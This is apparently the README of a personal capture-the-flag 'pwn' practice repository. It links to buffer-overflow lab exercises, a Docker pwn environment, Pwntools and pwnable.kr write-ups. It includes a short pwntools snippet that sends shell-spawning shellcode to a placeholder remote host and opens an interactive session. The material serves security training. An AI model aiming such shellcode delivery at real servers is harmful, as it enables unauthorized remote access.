# CTF Pwn

## Warm up

### The Attack Lab

This assignment involves generating a total of five attacks on two programs having different security vul- nerabilities, which helps you to understand buffer overflow bugs. More details can be seen in [README](labs/attack_lab/README.md).

## Tools

### Pwndocker

A docker environment for pwn in ctf based on phusion/baseimage:master-amd64, which is a modified ubuntu 20.04 baseimage for docker. More details in [Pwndocker](https://github.com/skysider/pwndocker).

And this project will be based on a personal forked [version](https://github.com/ZiyaoXie/pwndocker.git).

### Pwntools

[Pwntools](https://github.com/Gallopsled/pwntools) is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.

```Python
from pwn import *
context(arch = 'i386', os = 'linux')

r = remote('exploitme.example.com', 31337)
# EXPLOIT CODE GOES HERE
r.send(asm(shellcraft.sh()))
r.interactive()
```

## Template

This is a [template](template/README.md) for write-ups.

## pwnable.kr

Some [write-ups](pwnable.kr/README.md) for [pwnable.kr](http://pwnable.kr/index.php).
